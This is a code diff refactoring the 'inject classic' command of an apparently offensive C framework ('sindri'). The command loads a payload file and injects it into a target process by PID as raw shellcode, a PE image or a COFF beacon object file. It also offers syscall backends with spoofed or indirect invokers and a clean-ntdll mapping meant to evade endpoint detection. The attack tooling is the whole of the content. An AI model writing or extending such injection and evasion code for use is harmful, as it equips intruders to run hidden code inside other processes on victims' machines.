@@ -1,9 +1,8 @@
 #include <sindri.h>
+#include <unified/backend.h>
 #include <unified/cli.h>
 #include <unified/commands.h>
-#include <unified/common.h>
 #include <unified/print.h>
-#include <unified/syscall_cfg.h>
 
 static void print_usage(const char *prog) {
     usage_header(prog, "inject", "classic", "<mode> -f <payload_path> -p <target_pid> [options]");
@@ -16,14 +15,9 @@ static void print_usage(const char *prog) {
     usage_opt("-p", "<pid>", "Process ID of the remote target process.");
     usage_opt("-e", "<name>", "[COFF] Name of the entry point function (default: 'go').");
     usage_opt("-a", "<args>", "[COFF] Arguments string to pass to the BOF.");
-    usage_opt("", "--win", "Use Win32 API for loader.");
-    usage_opt("", "--nt", "Use Native API for injection + loader (default).");
-    usage_opt("", "--sys", "Use direct syscalls for injection + loader.");
-    usage_opt("", "--invoke-direct", "Syscall invoker: direct assembly.");
-    usage_opt("", "--invoke-indirect", "Syscall invoker: indirect assembly (default with --sys).");
-    usage_opt("", "--invoke-spoofed", "Syscall invoker: spoofed / stack-duplicated assembly.");
-    usage_opt("", "--resolve-scan", "SSN resolver: in-memory scan (default).");
-    usage_opt("", "--resolve-sort", "SSN resolver: export-table sort.");
+    usage_backend_flags();
+    usage_syscall_flags();
+    poc_fprintf("\nDefaults: --nt backend, indirect invoker, scan resolver with sort fallback, syscall cache off.\n");
 }
 
 int cmd_inject_classic(int argc, char *argv[], const char *prog) {
@@ -48,7 +42,7 @@ int cmd_inject_classic(int argc, char *argv[], const char *prog) {
     for (int i = 1; i < argc; i++) {
         const char *a = argv[i];
         if (poc_strcmp(a, "-f") == 0) {
-            if (require_arg(argc, argv, i, "-f")) {
+            if (require_arg(argc, i, "-f")) {
                 print_usage(prog);
                 return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
             }
@@ -56,7 +50,7 @@ int cmd_inject_classic(int argc, char *argv[], const char *prog) {
             continue;
         }
         if (poc_strcmp(a, "-p") == 0) {
-            if (require_arg(argc, argv, i, "-p")) {
+            if (require_arg(argc, i, "-p")) {
                 print_usage(prog);
                 return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
             }
@@ -64,7 +58,7 @@ int cmd_inject_classic(int argc, char *argv[], const char *prog) {
             continue;
         }
         if (poc_strcmp(a, "-e") == 0) {
-            if (require_arg(argc, argv, i, "-e")) {
+            if (require_arg(argc, i, "-e")) {
                 print_usage(prog);
                 return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
             }
@@ -72,12 +66,11 @@ int cmd_inject_classic(int argc, char *argv[], const char *prog) {
             continue;
         }
         if (poc_strcmp(a, "-a") == 0) {
-            if (require_arg(argc, argv, i, "-a")) {
+            snd_status_t parse_status = parse_bof_arg(argc, argv, &i, &bof_args, &bof_arg_len);
+            if (SND_FAILED(parse_status)) {
                 print_usage(prog);
-                return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
+                return parse_status.code;
             }
-            bof_args    = argv[++i];
-            bof_arg_len = (int)poc_strlen(bof_args) + 1;
             continue;
         }
         if (!parse_backend(argc, argv, &i, &backend))
@@ -96,87 +89,57 @@ int cmd_inject_classic(int argc, char *argv[], const char *prog) {
         return SND_STATUS_MISSING_COMMAND_LINE_ARGS;
     }
 
-    snd_status_t st       = SND_OK;
-    snd_buffer_t file_buf = {0};
-    PVOID        ntdll    = NULL;
+    snd_status_t       st       = SND_OK;
+    snd_buffer_t       file_buf = {0};
+    snd_ldr_pe_ctx_t   ldr_pe   = {0};
+    snd_ldr_coff_ctx_t ldr_coff = {0};
+    snd_inj_ctx_t      inj      = {0};
+    unified_backend_t  be       = {0};
 
-    const snd_memory_api_t  *mem_api  = NULL;
-    const snd_module_api_t  *mod_api  = NULL;
-    const snd_process_api_t *proc_api = NULL;
-
-    if (backend == API_SYS) {
-        st = snd_om_knowndll_map(&snd_map_nt, L"ntdll.dll", &ntdll);
-        if (SND_FAILED(st))
-            goto cleanup;
-        snd_ntdll_set_clean(ntdll);
-        apply_syscall_style(&scfg);
-
-        mem_api  = &snd_mem_sys;
-        mod_api  = &snd_mod_nt;
-        proc_api = &snd_proc_sys;
-        log_ok("Syscall mode active (known-dll mapped clean ntdll).");
-    } else if (backend == API_NT) {
-        mem_api  = &snd_mem_nt;
-        mod_api  = &snd_mod_nt;
-        proc_api = &snd_proc_nt;
-        log_ok("Native API mode active (ntdll exports).");
-    } else {
-        mem_api  = &unified_mem_win;
-        mod_api  = &unified_mod_win;
-        proc_api = &unified_proc_win;
-        log_ok("Win32 API mode active.");
-    }
-
-    log_info("Loading payload: %s", file_path);
-    st = unified_file_load(backend, file_path, &file_buf);
+    st = unified_backend_init(backend, &scfg, &be);
     if (SND_FAILED(st))
         goto cleanup;
 
+    log_ok("%s backend active.", unified_backend_name(backend));
+
+    log_info("Loading payload: %s", file_path);
+    st = unified_file_load(&be, file_path, &file_buf);
+    if (SND_FAILED(st))
+        goto cleanup;
+
+    inj.target_pid = target_pid;
+    inj.proc_api   = be.proc_api;
+
     if (poc_strcmp(mode, "shell") == 0) {
-        snd_inj_ctx_t inj = {0};
-        inj.target_pid    = target_pid;
-        inj.payload       = &file_buf;
-        inj.proc_api      = proc_api;
+        inj.payload = &file_buf;
         log_info("Firing classic shellcode injection...");
         st = snd_inj_classic_shell(&inj);
-        if (SND_SUCCEEDED(st))
-            log_ok("Injection completed successfully!");
-        snd_inj_cleanup(&inj);
     } else if (poc_strcmp(mode, "pe") == 0) {
-        snd_ldr_pe_ctx_t ldr = {0};
-        snd_inj_ctx_t    inj = {0};
-        ldr.mem_api          = mem_api;
-        ldr.mod_api          = mod_api;
-        ldr.raw_source       = &file_buf;
-        inj.target_pid       = target_pid;
-        inj.proc_api         = proc_api;
+        ldr_pe.mem_api    = be.mem_api;
+        ldr_pe.mod_api    = be.mod_api;
+        ldr_pe.raw_source = &file_buf;
         log_info("Firing classic PE injection...");
-        st = snd_inj_classic_pe(&ldr, &inj);
-        if (SND_SUCCEEDED(st))
-            log_ok("Injection completed successfully!");
-        snd_inj_cleanup(&inj);
-        snd_ldr_pe_free_mapped_image(&ldr);
+        st = snd_inj_classic_pe(&ldr_pe, &inj);
     } else if (poc_strcmp(mode, "coff") == 0) {
-        snd_ldr_coff_ctx_t ldr = {0};
-        snd_inj_ctx_t      inj = {0};
-        ldr.mem_api            = mem_api;
-        ldr.mod_api            = mod_api;
-        ldr.raw_source         = &file_buf;
-        inj.target_pid         = target_pid;
-        inj.proc_api           = proc_api;
+        ldr_coff.mem_api    = be.mem_api;
+        ldr_coff.mod_api    = be.mod_api;
+        ldr_coff.raw_source = &file_buf;
         log_info("Firing classic COFF injection...");
-        st = snd_inj_classic_coff(&ldr, &inj, entry_name, bof_args, bof_arg_len);
-        if (SND_SUCCEEDED(st))
-            log_ok("Injection completed successfully!");
-        snd_inj_cleanup(&inj);
-        snd_ldr_coff_free_mapped_image(&ldr);
+        st = snd_inj_classic_coff(&ldr_coff, &inj, entry_name, bof_args, bof_arg_len);
     } else {
         log_err("Unknown mode: %s. Use shell, pe, or coff.", mode);
         st = SND_ERR(SND_STATUS_INVALID_COMMAND_LINE_ARG);
     }
 
+    if (SND_SUCCEEDED(st))
+        log_ok("Injection completed successfully!");
+
 cleanup:
+    snd_inj_cleanup(&inj);
+    snd_ldr_pe_free_mapped_image(&ldr_pe);
+    snd_ldr_coff_free_mapped_image(&ldr_coff);
     snd_buffer_free(&file_buf);
+
     if (SND_FAILED(st)) {
         snd_status_print(st);
         return st.code;
